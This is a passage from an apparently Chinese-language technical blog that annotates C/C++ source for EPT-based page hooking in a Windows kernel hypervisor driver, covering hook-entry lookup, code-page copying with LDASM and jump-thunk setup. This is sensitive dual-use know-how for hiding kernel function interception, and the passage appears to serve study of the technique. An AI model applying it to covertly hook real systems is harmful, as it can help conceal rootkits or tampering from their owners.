in2。</span></span><br><span class="line">        ((<span class="built_in">ULONG64</span>( *)(ULONG64, ULONG64))(ULONG_PTR)pEntry-&gt;OriginalData)(in1, in2);</span><br><span class="line">    <span class="comment">// 返回固定值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xDEADBEEF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取对应函数的HookEntry"><a href="#获取对应函数的HookEntry" class="headerlink" title="获取对应函数的HookEntry"></a>获取对应函数的HookEntry</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get hook data by function pointer</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found entry or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PPAGE_HOOK_ENTRY <span class="title">PHGetHookEntry</span><span class="params">( IN PVOID ptr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的HookEntry钩子入口数据结构</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 计算PAGE_HOOK_ENTRY结构体的地址</span></span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断是否找到了匹配的PAGE_HOOK_ENTRY</span></span><br><span class="line">        <span class="keyword">if</span> (pEntry-&gt;OriginalPtr == ptr)</span><br><span class="line">            <span class="keyword">return</span> pEntry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面钩子"><a href="#页面钩子" class="headerlink" title="页面钩子"></a>页面钩子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Hook function</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Function address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pHook&quot;&gt;Hook address&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// /// &lt;param name=&quot;Type&quot;&gt;Hook type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHHook</span><span class="params">( IN PVOID pFunc, IN PVOID pHook )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PUCHAR CodePage = <span class="literal">NULL</span>;</span><br><span class="line">    BOOLEAN Newpage = FALSE;</span><br><span class="line">    PHYSICAL_ADDRESS phys = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    phys.QuadPart = MAXULONG64;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查EPT是否开启，权限是否为仅执行</span></span><br><span class="line">    <span class="keyword">if</span> (!g_Data-&gt;Features.EPT || !g_Data-&gt;Features.ExecOnlyEPT)</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_SUPPORTED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查页面是否已经被钩子</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pEntry = <span class="built_in">PHGetHookEntryByPage</span>( pFunc, DATA_PAGE );</span><br><span class="line">    <span class="keyword">if</span> (pEntry != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 已经有钩子，获取HookEntry中的CodePageVA</span></span><br><span class="line">        CodePage = pEntry-&gt;CodePageVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 没有钩子，分配一个连续页面</span></span><br><span class="line">        CodePage = <span class="built_in">MmAllocateContiguousMemory</span>( PAGE_SIZE, phys );</span><br><span class="line">        Newpage = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CodePage == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配PAGE_HOOK_ENTRY结构体内存</span></span><br><span class="line">    PPAGE_HOOK_ENTRY pHookEntry = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPool, <span class="built_in">sizeof</span>( PAGE_HOOK_ENTRY ), HB_POOL_TAG );</span><br><span class="line">    <span class="keyword">if</span> (pHookEntry == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>( pHookEntry, <span class="built_in">sizeof</span>( PAGE_HOOK_ENTRY ) );</span><br><span class="line">    <span class="comment">// 将原始函数代码拷贝到CodePage所指向的内存页</span></span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>( CodePage, <span class="built_in">PAGE_ALIGN</span>( pFunc ), PAGE_SIZE );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将原始函数代码拷贝到PAGE_HOOK_ENTRY的OriginalData缓冲区，并记录复制的代码长度</span></span><br><span class="line">    NTSTATUS status = <span class="built_in">PHpCopyCode</span>( pFunc, pHookEntry-&gt;OriginalData, &amp;pHookEntry-&gt;OriginalSize );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pHookEntry, HB_POOL_TAG );</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算函数地址相对于页面的偏移</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    掩码运算通过将一个页面大小减一的二进制数作为掩码，与待对齐地址进行位运算，</span></span><br><span class="line"><span class="comment">    将指定位数之外的位都设置为0，从而达到向4kb对齐的目的。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ULONG_PTR page_offset = (ULONG_PTR)pFunc - (ULONG_PTR)<span class="built_in">PAGE_ALIGN</span>( pFunc );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化JUMP_THUNK结构体，用于跳转到Hook函数</span></span><br><span class="line">    JUMP_THUNK thunk = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">PHpInitJumpThunk</span>( &amp;thunk, (ULONG64)pHook );</span><br><span class="line">    <span class="built_in">memcpy</span>( CodePage + page_offset, &amp;thunk, <span class="built_in">sizeof</span>( thunk ) );<span class="comment">// 将JUMP_THUNK结构体拷贝到CodePage的偏移处</span></span><br><span class="line"></span><br><span class="line">    pHookEntry-&gt;OriginalPtr = pFunc;<span class="comment">// 原始函数地址</span></span><br><span class="line">    pHookEntry-&gt;DataPageVA = <span class="built_in">PAGE_ALIGN</span>( pFunc );<span class="comment">// 数据页面虚拟地址</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    物理帧号是指在操作系统中用来管理物理内存的一种编号方式。</span></span><br><span class="line"><span class="comment">    物理内存由一系列连续的物理页面（或称为物理帧）组成，每个物理页面的大小通常是固定的，</span></span><br><span class="line"><span class="comment">    比如4KB或者更大的幂次方。</span></span><br><span class="line"><span class="comment">    物理帧号是用来标识这些物理页面的唯一数字编号。它与物理内存地址相对应，可以用于将逻辑地址映射到物理地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    操作系统通过维护一个数据结构（如页表、段表等）来管理和跟踪物理内存的使用情况。</span></span><br><span class="line"><span class="comment">    这些数据结构中的条目使用物理帧号来标识每个物理页面的状态，如被使用、空闲、保留等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过使用物理帧号，操作系统可以实现内存分页机制、内存保护、虚拟内存管理等功能。</span></span><br><span class="line"><span class="comment">    它使得操作系统能够有效地管理和控制物理内存资源，同时提供了对进程的内存访问控制和地址映射的支持。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pHookEntry-&gt;DataPagePFN = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( pFunc ).QuadPart );<span class="comment">// 数据页面物理帧号</span></span><br><span class="line">    pHookEntry-&gt;CodePageVA = CodePage;<span class="comment">// 代码页面虚拟地址</span></span><br><span class="line">    pHookEntry-&gt;CodePagePFN = <span class="built_in">PFN</span>( <span class="built_in">MmGetPhysicalAddress</span>( CodePage ).QuadPart );<span class="comment">// 代码页面物理帧号</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查全局链表是否为空，如果为空则初始化链表</span></span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">InitializeListHead</span>( &amp;g_PageList );</span><br><span class="line">    <span class="built_in">InsertTailList</span>( &amp;g_PageList, &amp;pHookEntry-&gt;Link );<span class="comment">// 将PAGE_HOOK_ENTRY结构体插入全局链表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新分配的页面</span></span><br><span class="line">    <span class="keyword">if</span> (Newpage)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建HOOK_CONTEXT结构体，设置对应的值</span></span><br><span class="line">        HOOK_CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ctx.Hook = TRUE;</span><br><span class="line">        ctx.DataPagePFN = pHookEntry-&gt;DataPagePFN;</span><br><span class="line">        ctx.CodePagePFN = pHookEntry-&gt;CodePagePFN;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行PHpHookCallbackDPC回调创建EPT页面映射</span></span><br><span class="line">        <span class="built_in">KeGenericCallDpc</span>( PHpHookCallbackDPC, &amp;ctx );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算物理帧"><a href="#计算物理帧" class="headerlink" title="计算物理帧"></a>计算物理帧</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里的PFN是一个宏函数，接受一个地址作为参数，使用位移操作符&gt;&gt;将地址右移PAGE_SHIFT位，并将结果强制转换为ULONG64类型，作为物理帧号返回。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PAGE_SHIFT是一个常量或宏，表示页面大小与页内偏移之间的位移量。通常，页面大小是2的幂次方，例如4KB页面大小对应的PAGE_SHIFT值为12，即右移12位。位移操作实际上是对地址进行除法运算，将高位的部分消除，得到一个较小的数值，该数值就是物理帧号。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN(addr)                   (ULONG64)((addr) &gt;&gt; PAGE_SHIFT)</span></span><br></pre></td></tr></table></figure><h4 id="获取页面函数钩子信息"><a href="#获取页面函数钩子信息" class="headerlink" title="获取页面函数钩子信息"></a>获取页面函数钩子信息</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get hook data by page address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ptr&quot;&gt;Function pointer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Type&quot;&gt;Page type&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found hook entry or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PPAGE_HOOK_ENTRY <span class="title">PHGetHookEntryByPage</span><span class="params">( IN PVOID ptr, IN PAGE_TYPE Type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_PageList.Flink == <span class="literal">NULL</span> || <span class="built_in">IsListEmpty</span>( &amp;g_PageList ))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PVOID page = <span class="built_in">PAGE_ALIGN</span>( ptr );<span class="comment">// 确保页面对齐</span></span><br><span class="line">    <span class="comment">// 遍历g_PageList查找匹配的PAGE_HOOK_ENTRY结构体</span></span><br><span class="line">    <span class="keyword">for</span> (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将节点转换为PAGE_HOOK_ENTRY结构体初始位置</span></span><br><span class="line">        PPAGE_HOOK_ENTRY pEntry = <span class="built_in">CONTAINING_RECORD</span>( pListEntry, PAGE_HOOK_ENTRY, Link );</span><br><span class="line">        <span class="comment">// 判断钩子的页面类型、数据是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> ((Type == DATA_PAGE &amp;&amp; pEntry-&gt;DataPageVA == page) || (Type == CODE_PAGE &amp;&amp; pEntry-&gt;CodePageVA == page))</span><br><span class="line">            <span class="keyword">return</span> pEntry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="计算给定成员的结构体初始位置"><a href="#计算给定成员的结构体初始位置" class="headerlink" title="计算给定成员的结构体初始位置"></a>计算给定成员的结构体初始位置</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">接受三个参数：address是指向某个成员的指针，type是结构体类型，field是结构体中的成员名。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">宏定义使用了一些指针运算和转换来计算结构体的起始地址。首先，将address强制转换为PCHAR类型（字符指针），然后通过减去(&amp;((type *)0)-&gt;field)的结果，得到结构体中成员field相对于结构体起始地址的偏移量（以字节计）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">接下来，将该偏移量加到address的地址上，得到结构体的起始地址，并将其强制转换为目标的type类型指针，最终返回该指针作为结果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个宏定义可以用于在已知结构体的某个成员地址的情况下，快速地获取整个结构体的起始地址。这种技巧在处理数据结构时非常有用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONTAINING_RECORD(address, type, field) ((type *)( \</span></span><br><span class="line"><span class="meta">                                                  (PCHAR)(address) - \</span></span><br><span class="line"><span class="meta">                                                  (ULONG_PTR)(&amp;((type *)0)-&gt;field)))</span></span><br></pre></td></tr></table></figure><h4 id="通过LDASM工具将原始字节复制到指定的缓冲区中"><a href="#通过LDASM工具将原始字节复制到指定的缓冲区中" class="headerlink" title="通过LDASM工具将原始字节复制到指定的缓冲区中"></a>通过LDASM工具将原始字节复制到指定的缓冲区中</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Copy original bytes using LDASM</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pFunc&quot;&gt;Original function ptr&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;OriginalStore&quot;&gt;Buffer to store bytes&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pSize&quot;&gt;Lenght of copied data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">PHpCopyCode</span><span class="params">( IN PVOID pFunc, OUT PUCHAR OriginalStore, OUT PULONG pSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    LDASM是一个函数解析工具，用于解析x86和x64指令的长度和操作码。它可以读取给定地址上的指令，</span></span><br><span class="line"><span class="comment">    并提供有关指令的详细信息，例如指令长度、操作码、操作数等。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过使用LDASM，开发人员可以分析和处理二进制代码，包括动态修改和重写函数的字节码。</span></span><br><span class="line"><span class="comment">    它是基于汇编和机器码规范的解析库，它能够准确地分析各种指令，并提供相关信息以供后续处理。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 追踪已复制的总字节数</span></span><br><span class="line">    PUCHAR src = pFunc;<span class="comment">// 指向原始函数地址</span></span><br><span class="line">    PUCHAR old = OriginalStore;<span class="comment">// 指向目标地址OriginalStore缓冲区</span></span><br><span class="line">    ULONG all_len = <span class="number">0</span>;<span class="comment">// 已复制的总字节数</span></span><br><span class="line">    ldasm_data ld = &#123; <span class="number">0</span> &#125;;<span class="comment">// ldasm_data结构体，用于存储指令信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG len = <span class="built_in">ldasm</span>( src, &amp;ld, TRUE );<span class="comment">// 解析指令，返回指令长度</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine code end</span></span><br><span class="line">        <span class="keyword">if</span> (ld.flags &amp; F_INVALID</span><br><span class="line">            || (len == <span class="number">1</span> &amp;&amp; (src[ld.opcd_offset] == <span class="number">0xCC</span> || src[ld.opcd_offset] == <span class="number">0xC3</span>))</span><br><span class="line">            || (len == <span class="number">3</span> &amp;&amp; src[ld.opcd_offset] == <span class="number">0xC2</span>)</span><br><span class="line">            || len + all_len &gt; <span class="number">128</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 解析失败或者指令长度超过128字节或者指令为单字节返回(0xcc\0xc3)、3字节返回(0xc2),RET、RETN、RETF</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将原始函数代码拷贝到OriginalStore缓冲区</span></span><br><span class="line">        <span class="built_in">memcpy</span>( old, src, len );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果指令中有相对偏移，需要修复</span></span><br><span class="line">        <span class="keyword">if</span> (ld.flags &amp; F_RELATIVE)</span><br><span class="line">        &#123;</span><br><span class="line">            LONG diff = <span class="number">0</span>;</span><br><span class="line">            <span class="type">const</span> <span class="type">uintptr_t</span> ofst = (ld.disp_offset != <span class="number">0</span> ? ld.disp_offset : ld.imm_offset);</span><br><span class="line">            <span class="type">const</span> <span class="type">uintptr_t</span> sz = ld.disp_size != <span class="number">0</span> ? ld.disp_size : ld.imm_size;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>( &amp;diff, src + ofst, sz );</span><br><span class="line">            <span class="comment">// 检查跳转目标地址是否超过了2GB的范围。如果跳转目标地址大于2GB，则跳转会导致整数溢出和错误的行为。</span></span><br><span class="line">            <span class="keyword">if</span> (_abs64( src + len + diff - old ) &gt; INT_MAX)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                diff += (LONG)(src - old);</span><br><span class="line">                <span class="built_in">memcpy</span>( old + ofst, &amp;diff, sz );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        src += len;</span><br><span class="line">        old += len;</span><br><span class="line">        all_len += len;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (all_len &lt; <span class="built_in">sizeof</span>( JUMP_THUNK ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否成功复制了JUMP_THUNK结构体</span></span><br><span class="line">    <span class="keyword">if</span> (all_len &lt; <span class="built_in">sizeof</span>( JUMP_THUNK ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 初始化JUMP_THUNK结构体，用于跳转到Hook函数</span></span><br><span class="line">        <span class="built_in">PHpInitJumpThunk</span>( (PJUMP_THUNK)old, (ULONG64)src );</span><br><span class="line">        *pSize = all_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="LDASM-返回指令长度"><a href="#LDASM-返回指令长度" class="headerlink" title="LDASM 返回指令长度"></a>LDASM 返回指令长度</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 